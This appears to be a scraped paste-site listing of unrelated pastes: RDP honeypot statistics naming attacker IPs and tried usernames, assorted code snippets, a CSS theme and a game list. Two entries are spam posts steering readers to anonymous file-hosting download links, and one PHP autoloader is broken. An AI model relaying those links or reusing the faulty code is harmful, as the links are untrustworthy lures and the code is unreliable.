    ""Jiangsu"": 9,
    ""Dubai"": 3,
    ""Hanoi"": 3,
    ""Central Singapore"": 12,
    ""St.-Petersburg"": 15,
    ""Zurich"": 6
  },
  ""country"": {
    ""China"": 18,
    ""Seychelles"": 18,
    ""Netherlands"": 24,
    ""Hong Kong"": 15,
    ""United Kingdom"": 12,
    ""Lithuania"": 48,
    ""United States"": 594,
    ""Ukraine"": 15,
    ""France"": 6,
    ""Russia"": 66,
    ""United Arab Emirates"": 3,
    ""Vietnam"": 3,
    ""Singapore"": 12,
    ""Switzerland"": 6
  },
  ""account"": {
    ""(empty)"": 18,
    ""Domain"": 81,
    ""nmap"": 3,
    ""Administr"": 69,
    ""Test"": 30,
    ""IKGBBtMZv"": 3,
    ""WrbdoG"": 3,
    ""juRRFW"": 3,
    ""hello"": 600,
    ""gxSSthSoD"": 3,
    ""DWXBoW"": 3,
    ""bNXkGf"": 3,
    ""Administrator"": 3,
    ""CZWwlOhjT"": 3,
    ""RPKaXR"": 3,
    ""kZKDKQ"": 3,
    ""FSovHLvoe"": 3,
    ""GnADof"": 3,
    ""Ugslrf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 840
  },
  ""client_build"": {
    ""Unknown"": 840
  },
  ""client_name"": {
    ""Unknown"": 840
  },
  ""ip_type"": {
    ""Unknown"": 219,
    ""hosting"": 600,
    ""hosting & proxy"": 15,
    ""proxy"": 3,
    ""mobile"": 3
  }
}"
miJeF6rP,2023-10-02_stats.json,rdp_snitch,JSON,Monday 2nd of October 2023 07:16:15 PM CDT,"{
  ""ip"": {
    ""106.116.169.71"": 4,
    ""193.142.147.9"": 12,
    ""193.142.146.17"": 12,
    ""152.32.192.36"": 2,
    ""87.251.75.145"": 4,
    ""194.165.16.10"": 8,
    ""141.98.11.128"": 6,
    ""205.210.31.82"": 6,
    ""5.161.224.71"": 4,
    ""167.94.138.51"": 2,
    ""194.165.16.111"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 2,
    ""138.197.109.5"": 4,
    ""54.144.241.209"": 360,
    ""45.143.201.62"": 10,
    ""38.181.35.81"": 6,
    ""212.129.42.204"": 2,
    ""43.132.213.11"": 2,
    ""205.210.31.248"": 6,
    ""163.172.201.146"": 2,
    ""195.181.244.184"": 4,
    ""136.144.35.81"": 2,
    ""62.204.41.137"": 8,
    ""45.227.254.26"": 4,
    ""45.140.17.16"": 4,
    ""58.218.204.183"": 6,
    ""83.97.73.77"": 4,
    ""165.154.12.38"": 2,
    ""111.61.253.55"": 2,
    ""103.171.0.205"": 2,
    ""146.190.83.254"": 8,
    ""198.235.24.32"": 6,
    ""87.251.75.64"": 2,
    ""45.227.254.8"": 4,
    ""85.209.11.69"": 2,
    ""62.122.184.166"": 8,
    ""62.122.184.168"": 8,
    ""213.226.123.100"": 10,
    ""31.171.251.109"": 4,
    ""194.165.16.11"": 4,
    ""205.210.31.106"": 6
  },
  ""asn"": {
    ""AS4134"": 10,
    ""AS208046"": 24,
    ""AS135377"": 4,
    ""AS208091"": 8,
    ""AS48721"": 14,
    ""AS209605"": 6,
    ""AS396982"": 24,
    ""AS213230"": 4,
    ""AS398324"": 2,
    ""AS197414"": 4,
    ""AS14061"": 12,
    ""AS14618"": 360,
    ""AS210950"": 10,
    ""AS140227"": 6,
    ""AS12876"": 4,
    ""AS132203"": 2,
    ""AS212531"": 4,
    ""AS396356"": 2,
    ""AS59425"": 8,
    ""AS267784"": 8,
    ""AS198953"": 4,
    ""AS208312"": 4,
    ""AS24547"": 2,
    ""AS63737"": 2,
    ""AS57523"": 18,
    ""AS49943"": 10,
    ""AS50837"": 4
  },
  ""isp"": {
    ""Chinanet"": 10,
    ""ColocationX Ltd."": 24,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Xhost Internet Solutions LP"": 12,
    ""Flyservers S.A."": 22,
    ""UAB Host Baltic"": 6,
    ""Google LLC"": 24,
    ""Hetzner Online GmbH"": 4,
    ""Censys, Inc."": 2,
    ""DigitalOcean, LLC"": 12,
    ""Amazon Technologies Inc."": 360,
    ""TOV E-RISHENNYA"": 10,
    ""Hong Kong Communications International Co., Limited"": 6,
    ""Online S.A.S."": 4,
    ""Aceville Pte.ltd"": 2,
    ""UAB \""Interneto vizija\"""": 4,
    ""Latitude.sh"": 2,
    ""Horizon LLC"": 8,
    ""Proton66 OOO"": 4,
    ""Red Byte LLC"": 4,
    ""China Mobile communications corporation"": 2,
    ""Vietserver Services Technology Company Limited"": 2,
    ""Chang Way Technologies Co. Limited"": 18,
    ""IT Resheniya LLC"": 10,
    ""CloudSigma"": 4
  },
  ""org"": {
    ""Chinanet HE"": 4,
    ""x33 Networks IBC"": 12,
    ""ColocationX Ltd"": 12,
    ""Ucloud Information Technology"": 4,
    ""Xhost Internet Solutions"": 8,
    ""Flyservers S.A"": 14,
    ""Unknown"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""HETZNER-DC"": 4,
    ""Censys, Inc"": 2,
    ""Xhostis"": 4,
    ""Digital Ocean"": 4,
    ""AWS EC2 (us-east-1)"": 360,
    ""TOV VAIZ PARTNER"": 10,
    ""HONG KONG COMMUNICATIONS INTERNATIONAL CO., LIMITED"": 6,
    ""ONLINE"": 4,
    ""RACKRAY"": 4,
    ""Panq B.V"": 2,
    ""Horizon LLC"": 8,
    ""UAB Host Baltic"": 8,
    ""Proton66 LLC"": 4,
    ""Chinanet JS"": 6,
    ""Red Byte LLC"": 4,
    ""China Mobile"": 2,
    ""YUH Application Software Company Limited"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Chang Way Technologies Co. Limited"": 18,
    ""IT Resheniya LLC"": 10
  },
  ""regionName"": {
    ""Hebei"": 6,
    ""English River"": 12,
    ""North Holland"": 16,
    ""Central and Western District"": 4,
    ""England"": 8,
    ""Kaunas"": 24,
    ""California"": 24,
    ""Virginia"": 364,
    ""Michigan"": 2,
    ""New Jersey"": 6,
    ""Kyiv City"": 10,
    ""Eastern"": 6,
    ""\u00cele-de-France"": 4,
    ""Moscow"": 34,
    ""Vilnius"": 8,
    ""Jiangsu"": 6,
    ""Dubai"": 2,
    ""Hanoi"": 2,
    ""Central Singapore"": 8,
    ""St.-Petersburg"": 10,
    ""Zurich"": 4
  },
  ""country"": {
    ""China"": 12,
    ""Seychelles"": 12,
    ""Netherlands"": 16,
    ""Hong Kong"": 10,
    ""United Kingdom"": 8,
    ""Lithuania"": 32,
    ""United States"": 396,
    ""Ukraine"": 10,
    ""France"": 4,
    ""Russia"": 44,
    ""United Arab Emirates"": 2,
    ""Vietnam"": 2,
    ""Singapore"": 8,
    ""Switzerland"": 4
  },
  ""account"": {
    ""(empty)"": 12,
    ""Domain"": 54,
    ""nmap"": 2,
    ""Administr"": 46,
    ""Test"": 20,
    ""IKGBBtMZv"": 2,
    ""WrbdoG"": 2,
    ""juRRFW"": 2,
    ""hello"": 400,
    ""gxSSthSoD"": 2,
    ""DWXBoW"": 2,
    ""bNXkGf"": 2,
    ""Administrator"": 2,
    ""CZWwlOhjT"": 2,
    ""RPKaXR"": 2,
    ""kZKDKQ"": 2,
    ""FSovHLvoe"": 2,
    ""GnADof"": 2,
    ""Ugslrf"": 2
  },
  ""keyboard"": {
    ""Unknown"": 560
  },
  ""client_build"": {
    ""Unknown"": 560
  },
  ""client_name"": {
    ""Unknown"": 560
  },
  ""ip_type"": {
    ""Unknown"": 146,
    ""hosting"": 400,
    ""hosting & proxy"": 10,
    ""proxy"": 2,
    ""mobile"": 2
  }
}"
0BX07gCB,2023-10-02_stats.json,rdp_snitch,JSON,Monday 2nd of October 2023 07:15:09 PM CDT,"{
  ""ip"": {
    ""106.116.169.71"": 2,
    ""193.142.147.9"": 6,
    ""193.142.146.17"": 6,
    ""152.32.192.36"": 1,
    ""87.251.75.145"": 2,
    ""194.165.16.10"": 4,
    ""141.98.11.128"": 3,
    ""205.210.31.82"": 3,
    ""5.161.224.71"": 2,
    ""167.94.138.51"": 1,
    ""194.165.16.111"": 1,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 1,
    ""138.197.109.5"": 2,
    ""54.144.241.209"": 180,
    ""45.143.201.62"": 5,
    ""38.181.35.81"": 3,
    ""212.129.42.204"": 1,
    ""43.132.213.11"": 1,
    ""205.210.31.248"": 3,
    ""163.172.201.146"": 1,
    ""195.181.244.184"": 2,
    ""136.144.35.81"": 1,
    ""62.204.41.137"": 4,
    ""45.227.254.26"": 2,
    ""45.140.17.16"": 2,
    ""58.218.204.183"": 3,
    ""83.97.73.77"": 2,
    ""165.154.12.38"": 1,
    ""111.61.253.55"": 1,
    ""103.171.0.205"": 1,
    ""146.190.83.254"": 4,
    ""198.235.24.32"": 3,
    ""87.251.75.64"": 1,
    ""45.227.254.8"": 2,
    ""85.209.11.69"": 1,
    ""62.122.184.166"": 4,
    ""62.122.184.168"": 4,
    ""213.226.123.100"": 5,
    ""31.171.251.109"": 2,
    ""194.165.16.11"": 2,
    ""205.210.31.106"": 3
  },
  ""asn"": {
    ""AS4134"": 5,
    ""AS208046"": 12,
    ""AS135377"": 2,
    ""AS208091"": 4,
    ""AS48721"": 7,
    ""AS209605"": 3,
    ""AS396982"": 12,
    ""AS213230"": 2,
    ""AS398324"": 1,
    ""AS197414"": 2,
    ""AS14061"": 6,
    ""AS14618"": 180,
    ""AS210950"": 5,
    ""AS140227"": 3,
    ""AS12876"": 2,
    ""AS132203"": 1,
    ""AS212531"": 2,
    ""AS396356"": 1,
    ""AS59425"": 4,
    ""AS267784"": 4,
    ""AS198953"": 2,
    ""AS208312"": 2,
    ""AS24547"": 1,
    ""AS63737"": 1,
    ""AS57523"": 9,
    ""AS49943"": 5,
    ""AS50837"": 2
  },
  ""isp"": {
    ""Chinanet"": 5,
    ""ColocationX Ltd."": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Xhost Internet Solutions LP"": 6,
    ""Flyservers S.A."": 11,
    ""UAB Host Baltic"": 3,
    ""Google LLC"": 12,
    ""Hetzner Online GmbH"": 2,
    ""Censys, Inc."": 1,
    ""DigitalOcean, LLC"": 6,
    ""Amazon Technologies Inc."": 180,
    ""TOV E-RISHENNYA"": 5,
    ""Hong Kong Communications International Co., Limited"": 3,
    ""Online S.A.S."": 2,
    ""Aceville Pte.ltd"": 1,
    ""UAB \""Interneto vizija\"""": 2,
    ""Latitude.sh"": 1,
    ""Horizon LLC"": 4,
    ""Proton66 OOO"": 2,
    ""Red Byte LLC"": 2,
    ""China Mobile communications corporation"": 1,
    ""Vietserver Services Technology Company Limited"": 1,
    ""Chang Way Technologies Co. Limited"": 9,
    ""IT Resheniya LLC"": 5,
    ""CloudSigma"": 2
  },
  ""org"": {
    ""Chinanet HE"": 2,
    ""x33 Networks IBC"": 6,
    ""ColocationX Ltd"": 6,
    ""Ucloud Information Technology"": 2,
    ""Xhost Internet Solutions"": 4,
    ""Flyservers S.A"": 7,
    ""Unknown"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""HETZNER-DC"": 2,
    ""Censys, Inc"": 1,
    ""Xhostis"": 2,
    ""Digital Ocean"": 2,
    ""AWS EC2 (us-east-1)"": 180,
    ""TOV VAIZ PARTNER"": 5,
    ""HONG KONG COMMUNICATIONS INTERNATIONAL CO., LIMITED"": 3,
    ""ONLINE"": 2,
    ""RACKRAY"": 2,
    ""Panq B.V"": 1,
    ""Horizon LLC"": 4,
    ""UAB Host Baltic"": 4,
    ""Proton66 LLC"": 2,
    ""Chinanet JS"": 3,
    ""Red Byte LLC"": 2,
    ""China Mobile"": 1,
    ""YUH Application Software Company Limited"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Chang Way Technologies Co. Limited"": 9,
    ""IT Resheniya LLC"": 5
  },
  ""regionName"": {
    ""Hebei"": 3,
    ""English River"": 6,
    ""North Holland"": 8,
    ""Central and Western District"": 2,
    ""England"": 4,
    ""Kaunas"": 12,
    ""California"": 12,
    ""Virginia"": 182,
    ""Michigan"": 1,
    ""New Jersey"": 3,
    ""Kyiv City"": 5,
    ""Eastern"": 3,
    ""\u00cele-de-France"": 2,
    ""Moscow"": 17,
    ""Vilnius"": 4,
    ""Jiangsu"": 3,
    ""Dubai"": 1,
    ""Hanoi"": 1,
    ""Central Singapore"": 4,
    ""St.-Petersburg"": 5,
    ""Zurich"": 2
  },
  ""country"": {
    ""China"": 6,
    ""Seychelles"": 6,
    ""Netherlands"": 8,
    ""Hong Kong"": 5,
    ""United Kingdom"": 4,
    ""Lithuania"": 16,
    ""United States"": 198,
    ""Ukraine"": 5,
    ""France"": 2,
    ""Russia"": 22,
    ""United Arab Emirates"": 1,
    ""Vietnam"": 1,
    ""Singapore"": 4,
    ""Switzerland"": 2
  },
  ""account"": {
    ""(empty)"": 6,
    ""Domain"": 27,
    ""nmap"": 1,
    ""Administr"": 23,
    ""Test"": 10,
    ""IKGBBtMZv"": 1,
    ""WrbdoG"": 1,
    ""juRRFW"": 1,
    ""hello"": 200,
    ""gxSSthSoD"": 1,
    ""DWXBoW"": 1,
    ""bNXkGf"": 1,
    ""Administrator"": 1,
    ""CZWwlOhjT"": 1,
    ""RPKaXR"": 1,
    ""kZKDKQ"": 1,
    ""FSovHLvoe"": 1,
    ""GnADof"": 1,
    ""Ugslrf"": 1
  },
  ""keyboard"": {
    ""Unknown"": 280
  },
  ""client_build"": {
    ""Unknown"": 280
  },
  ""client_name"": {
    ""Unknown"": 280
  },
  ""ip_type"": {
    ""Unknown"": 73,
    ""hosting"": 200,
    ""hosting & proxy"": 5,
    ""proxy"": 1,
    ""mobile"": 1
  }
}"
gyXzAgJJ,Jojo's Steel Ball Run,anaodia7,CSS,Monday 2nd of October 2023 06:44:01 PM CDT,"/*Usar por cima do Yotsuba Blue*/

html{
    background-image:url(""https://i.ibb.co/RHDnCxL/jjbg.png"");
    background-repeat: inherit;
    background-size: cover;
    background-attachment: fixed;
}

body{
    background: rgba(254, 168, 24, 0.5) !important;
    color:#000;
    font-family:arial,helvetica,sans-serif;
    font-size:10pt;
}

a{
  color: #186efe;
text-shadow: black 1px 1px 1px;
}

.options_tab_icon.active, .options_tab_icon:hover{
  color: gold;
}

a:hover{
  color: green;
text-shadow: black 1px 1px 1px;
}

form table tr th, #options_div, #alert_div, div.pages, .theme-catalog div.grid-size-small{
  color: gold;
  background: #186efe;
  border: dotted blue 2px;
}

.boardlist{
  background: #186efe !important;
  color: gold !important;
  border-bottom: dotted blue 2px !important;
}

.boardlist a{
  color: #A2C5FE !important;
}

.boardlist a:hover{
  color: green !important;
}

div.post.reply{
  border: dotted blue 2px;
  background: #74A8FE;
}

.intro span.name{
  color: gold !important;
text-shadow: black 1px 1px 1px;
}
 
div.post.reply.highlighted{
    background: magenta;
    border: #FFF 2px dashed !important;
  color: #FFF;
}

div.post.reply:hover{
    background: #392c20;
    border: green 2px dashed !important;
  color: green;
}

/*banner shit*/
img.banner, img.board_image {
    display: block;
 
/*added linkcde*/
    content:url('https://i.ibb.co/HKsBNd5/1500jojo.png');
    border: 2px dashed gold;
  margin-top: 40px !important;
}
 
 
a.quick-reply-btn{
  visibility: hidden !important;
visibility: collapse !important;
}
 
textarea#body{
   width: 295px;
   height: 92px;
}
 
.dropzone-wrap{
  width: 295px !important;
}

h1, h2, h3, h4, div.ban h2{
  color: gold !important;
}"
7kaMnZQq,PythonOperators,sissou123,Python,Monday 2nd of October 2023 06:30:14 PM CDT,"PythonOperators

 In Python programming, Operators in general are used to perform operations on values and variables. These are standard symbols used for the ...
for more:
https://www.gulf-up.com/6o28gdg90h1z


"
sMn1ms3s,Haloween Automation,learnelectronics,Arduino,Monday 2nd of October 2023 06:20:55 PM CDT,"/********************************************************
 *  Arduino Foundation Series: Automatic Jackolantern   *
 *              Learnelectronics Oct. 2023 (C)         *
 *       https://www.youtube.com/learnelectronics       *
 ********************************************************/
// Define constants for pin numbers
const int inputPin = 2; // The input pin to monitor
const int ledPin1 = 5;  // First LED pin
const int ledPin2 = 6;  // Second LED pin


// Variables to track LED state and timing
bool ledState1 = LOW;   // Initial LED state for LED 1
bool ledState2 = LOW;   // Initial LED state for LED 2
unsigned long previousMillis = 0; // Stores the last time LEDs were toggled
const long interval = 1000; // Interval for the 1-second duty cycle (in milliseconds)



void setup() {
  pinMode(inputPin, INPUT); // Set the input pin as INPUT
  pinMode(ledPin1, OUTPUT); // Set the LED pins as OUTPUT
  pinMode(ledPin2, OUTPUT);
  pinMode(3,OUTPUT);
}

void loop() {
  // Read the state of the input pin
  int buttonState = digitalRead(inputPin);
  
  // Check if the input pin is HIGH (button pressed)
  if (buttonState == HIGH) {
    unsigned long currentMillis = millis(); // Get the current time
    
    // Check if it's time to toggle the LEDs
    if (currentMillis - previousMillis >= interval) {
      // Save the current time
      previousMillis = currentMillis;
      
      // Toggle the state of both LEDs
      ledState1 = !ledState1;
      ledState2 = !ledState2;
      
      // Set the LEDs to their new states
      digitalWrite(ledPin1, ledState1);
      digitalWrite(ledPin2, ledState2);

      for (int i = 200; i <= 400; i++) {
    tone(3, i);
    delay(11);
  }
    noTone(3);  
    }
  } else {
    // If the input pin is LOW (button not pressed), turn off both LEDs
    digitalWrite(ledPin1, LOW);
    digitalWrite(ledPin2, LOW);
  }
}"
DcDb4YQw,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:10:02 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3001);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000)  + 1;
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin()  + 1;
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
vW1rQ4kV,Untitled,sissou123,Python,Monday 2nd of October 2023 06:09:03 PM CDT,"DSA: Recursion with Python
Recursion is an important concept in computer programming. It allows us to create a function that calls itself. A good knowledge of recursion will help us understand the overall concept of data structures and algorithms more effectively.

Learn Recursion with Python will help you learn the concept of recursion from the very basics level with images, examples and challenges.
for more: https://www.file-upload.org/wsfqy1bq1ktp"
wsqWSM6B,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:07:15 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3000);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000);
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin();
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
22mbaXpB,Untitled,thehunmonkgroup,Python,Monday 2nd of October 2023 06:06:57 PM CDT,"import asyncio
import aio_pika
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
from queue import Queue

class Resource:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.executor = ThreadPoolExecutor(max_workers=1)
        self.connection = None
        self.channel = None
        self.queue = Queue()

    def start(self):
        Thread(target=self.loop_in_thread, args=(self.loop,)).start()

    def loop_in_thread(self, loop):
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.connect())
        loop.run_forever()

    async def connect(self):
        self.connection = await aio_pika.connect_robust(""amqp://guest:guest@localhost/"", loop=self.loop)
        self.channel = await self.connection.channel()
        queue = await self.channel.declare_queue('test_queue')
        await queue.consume(self.on_message)

    async def on_message(self, message):
        async with message.process():
            self.queue.put(message.body)

    def process_messages(self):
        while not self.queue.empty():
            message = self.queue.get()
            print(message)
            # Process the message here

    def stop(self):
        self.loop.call_soon_threadsafe(self.loop.stop)

if __name__ == ""__main__"":
    resource = Resource()
    resource.start()
    try:
        while True:
            resource.process_messages()
    except KeyboardInterrupt:
        resource.stop()"
uprFvj0V,Untitled,Zlatas863,PHP,Monday 2nd of October 2023 06:06:14 PM CDT,"<?php
// prní metoda
function LoadClass($class) {
  $subdir = ""classes/"";
  require_once($subdir . $classFile);
}
spl_autoload_register(""LoadClass"");

// druhá metoda
$subdir = ""classes/"";
$dir = opendir($subdir);
while ($file = readdir($dir)){
	if (pathinfo($file, PATHINFO_EXTENSION) == ""php""){
	require_once($subdir . $file);
}
closedir($dir);
?>"
5QwevFVv,"[review_form_url post_id=""""]",geminilabs,PHP,Monday 2nd of October 2023 05:44:20 PM CDT,"/**
 * Registers the [review_form_url post_id=""""] shortcode
 */
add_shortcode('review_form_url', function ($atts) {
	$atts = shortcode_atts(['post_id' => 0], $atts);
	$postId = (int) $atts['post_id'];
	return add_query_arg('assigned_post', get_the_ID(), get_permalink($postId));
});"
Pzjaty22,Counter,zwenboy,Lua,Monday 2nd of October 2023 05:18:42 PM CDT,"local ascii = [[ _   _ _   _  ____  ____ _____ _____ ____  
| \ | | | | |/ ___|/ ___| ____|_   _/ ___| 
|  \| | | | | |  _| |  _|  _|   | | \___ \ 
| |\  | |_| | |_| | |_| | |___  | |  ___) |
|_| \_|\___/ \____|\____|_____| |_| |____/ 
  ___   ___   ___   ___   ___   ___   ___  
 / _ \ / _ \ / _ \ / _ \ / _ \ / _ \ / _ \ 
| | | | | | | | | | | | | | | | | | | | | |
| |_| | |_| | |_| | |_| | |_| | |_| | |_| |
 \___/ \___/ \___/ \___/ \___/ \___/ \___/ 
]]
print(ascii)"
KeEi7dkF,MOK layout Aljamiado,dksetiavan,YAML,Monday 2nd of October 2023 05:13:07 PM CDT,"{
""title"":""Aljamiado"",
""onScreen"":{
""main"":[
""١٢٣٤٥٦٧٨٩٠"",
""قو[MC:َا]رتيَُِ[MC:بّ]"",
""اشدفغهسكل"",
""[SHIFT]ز[MC:شّ][MC:جّ]ْبنم[DEL]"",
""[TOOL][ALTGR:،][SPACE][][][SYM:.][ENTER]""
],

""shifted"":[
""﷽ﷻﷺﷸﷷﷶﷵﷴﷳﷲ"",
""خوأ[MC:رّ]طئًٌٍث"",
""ءصذـعحجكل"",
""[SHIFT]ةضظّب[MC:نّ]م[DEL]"",
""[LOCK][ALTGR:‍][SPACE][][][SYM:‌][ENTER]""
],

""sym"":[
""!@#$۞٪&*)(۝"",
""]}{\/_-=|+۩["",
""~؎﷼£¥€:؛'ʺ٭"",
""[SHIFT]؟…؏؞«»,.?[DEL]"",
""[LOCK][ALTGR:‍][SPACE][][][SYM:‌][ENTER]""
],

""altGr"":[
""1234567890"",
"">‎‏‭‮‬‪‫ <"",
""°•ىـ−ٱۤ،﴾﴿;"",
""[SHIFT]ٰٖٜٗ؍٫٬‐۔[DEL]"",
""[LOCK][ALTGR:,][SPACE][][][SYM:.][ENTER]""
]}}
    "
ptXwYewr,Big games com remoteplay,iZoOrD,HTML,Monday 2nd of October 2023 05:04:37 PM CDT,"Lista de jogos fodas atualizados by wisla quebra kanela 

1º Jogo do pato: https://store.steampowered.com/app/837470/Untitled_Goose_Game/
2º Dysmantle, apocalipse loko: https://store.steampowered.com/app/846770/DYSMANTLE/
3º Unravel Two, Jogo de trabalhar a massa cefalica: https://store.steampowered.com/app/1225570/Unravel_Two/
4º Unravel, msm coisa: https://store.steampowered.com/app/1225560/Unravel/
5º Moving Out, jogo de fazer mudança: https://store.steampowered.com/app/996770/Moving_Out/
6º Ship of Fools, é tipo sea of thieves soq 2d e full matar bixo(esse tem coop online tmb): https://store.steampowered.com/app/1286580/Ship_of_Fools/
7º Spelunky 2, melhor jogo do mundo igual o primeiro mas ngm joga bando de merdolas: https://store.steampowered.com/app/418530/Spelunky_2/
8º Spelunky, melhor jogo do ano quem discordar é gay: https://store.steampowered.com/app/239350/Spelunky/
9º Se mova ou morra(tmb tem online): https://store.steampowered.com/app/323850/Move_or_Die/

A SEGUIR TEM A SERIE DE TERROR THE DARK PICTURES JÁ Q O KRA CURTE UM TERRORZIN INTERATIVO

10º Primeiro jogo da série: https://store.steampowered.com/app/939850/The_Dark_Pictures_Anthology_Man_of_Medan/
11º Segundo jogo da série: https://store.steampowered.com/app/1194630/The_Dark_Pictures_Anthology_Little_Hope/
12º Terceiro jogo da série: https://store.steampowered.com/app/1281590/The_Dark_Pictures_Anthology_House_of_Ashes/
13º Quarto jogo da série(esse tem friend pass então se tu comprar da pra jogar online mas dizem q n funciona mt bem): https://store.steampowered.com/app/1567020/The_Dark_Pictures_Anthology_The_Devil_in_Me/

VOLTAMOS A PROGRAMAÇÃO NORMAL

14º Reforma de casas: https://store.steampowered.com/app/1004490/Tools_Up/
Simulador de lenhador loko: https://store.steampowered.com/app/976900/Lumberhill/
15º Esse aqui tu pode acabar com as festas alheias(matando geral)https://store.steampowered.com/app/572430/Party_Hard_2/
16º Nesse aqui nois tem que gerenciar uma rede de espaçonave: https://store.steampowered.com/app/1412850/Spacelines_from_the_Far_Out/
17º rinha de galinha: https://store.steampowered.com/app/1194250/Screaming_Chicken_Ultimate_Showdown/
18º joguinho de mago pra juntar as magia e zaralhar os bixo: https://store.steampowered.com/app/238370/Magicka_2/
19º esse aqui eh o 1: https://store.steampowered.com/app/42910/Magicka/
20º esse tu ja tem(historinhas): https://store.steampowered.com/app/960990/Beyond_Two_Souls/
21º desarmar bombas fodas: https://store.steampowered.com/app/341800/Keep_Talking_and_Nobody_Explodes/
22º tu ta no espaço e tem que tentar n cair no void(esse eh hard) https://store.steampowered.com/app/1138850/Heavenly_Bodies/
23º Franquia Trine, tu ja deve ter todos(todos tem coop): https://store.steampowered.com/bundle/12292/Trineverse/
Trine 5(por algum motivo eh separado): https://store.steampowered.com/app/1436700/Trine_5_A_Clockwork_Conspiracy/
Briga de bolo: https://store.steampowered.com/app/971690/Cake_Bash/
24º simulador de trabaio: https://store.steampowered.com/app/2131350/My_Coworker_is_an_Idiot/
25º n eh camundongo nem preá, tu guia um rato e tem q furtar: https://store.steampowered.com/app/1951230/Pizza_Possum/"
ArQLMtsy,LSD_v2,Korotkodul,C++,Monday 2nd of October 2023 04:37:25 PM CDT,"#include <cmath>
#include <iostream>
#include <vector>

using std::cin;
using std::cout;
using std::max;
using std::min;
using std::string;
using std::vector;
using Ll = long long;

const int k20 = 20;
const int k10 = 10;
int len;
vector<Ll> ar;
vector<int> less_than;
vector<Ll> hlp;

int Digit(Ll num, int par) {
  Ll mod = pow(k10, par + 1);
  Ll div = pow(k10, par);
  return num % mod / div;
}

void PrecountLessThan(int par) {
  less_than.assign(k10, 0);
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    less_than[dig]++;
  }
}

void CountLessThan() {
  int cnt = 0;
  for (int id = 0; id < k10; ++id) {
    int point = less_than[id];
    less_than[id] = cnt;
    cnt += point;
  }
}

void LSD(int par) {
  PrecountLessThan(par);
  CountLessThan();
  // sort непосредственно по par-й цифре с конца
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    hlp[less_than[dig]] = ar[id];
    less_than[dig]++;
  }
  ar = hlp;
}

int main() {
  /*std::ios::sync_with_stdio(false);
  std::cin.tie(0);
  std::cout.tie(0);*/
  cin >> len;
  ar.resize(len);
  hlp.resize(len);
  for (Ll& el : ar) {
    cin >> el;
  }
  // sort-им по каждой цифре с конца (В long long  не более 20ти цифр)
  for (int par = 0; par < k20; ++par) {
    LSD(par);
  }
  for (Ll el : ar) {
    cout << el << ""\n"";
  }
}
"
WHB3nkzn,Untitled,anechka_ne_plach,Python,Monday 2nd of October 2023 04:05:36 PM CDT,"        bin_1_val = np.repeat(np.arange(0, a_max + 1)[None, :], (a_max - a_min + 1), axis=0)
        bin_1_ns = np.arange(a_min, a_max + 1)
        bin_1_ps = np.full_like(np.zeros((a_max - a_min + 1, 1)), p1)
        bin_1_prob = binom.pmf(bin_1_val, bin_1_ns[:, None], bin_1_ps)

        bin_2_val = np.repeat(np.arange(0, b_max + 1)[None, :], (b_max - b_min + 1), axis=0)
        bin_2_ns = np.arange(b_min, b_max + 1)
        bin_2_ps = np.full_like(np.zeros((b_max - b_min + 1, 1)), p2)
        bin_2_prob = binom.pmf(bin_2_val, bin_2_ns[:, None], bin_2_ps)

        c_probs = scipy.signal.convolve(bin_1_prob[:, :, None], bin_2_prob[:, None, :])"
rvyV8bNw,Untitled,sanya5791,JSON,Monday 2nd of October 2023 03:48:09 PM CDT,"{
  ""filterCountWithShowMore"": 3,
  ""allFilterOptionsCount"": 1,
  ""maxPrice"": 300,
  ""starRatings"": [
    {
      ""id"": ""3.0"",
      ""label"": ""3+ Star Level""
    },
    {
      ""id"": ""4.0"",
      ""label"": ""4+ Star Level""
    },
    {
      ""id"": ""5.0"",
      ""label"": ""5+ Star Level""
    }
  ],
  ""guestScore"": [
    {
      ""id"": ""7.0"",
      ""label"": ""7.0+""
    },
    {
      ""id"": ""8.0"",
      ""label"": ""8.0+""
    },
    {
      ""id"": ""9.0"",
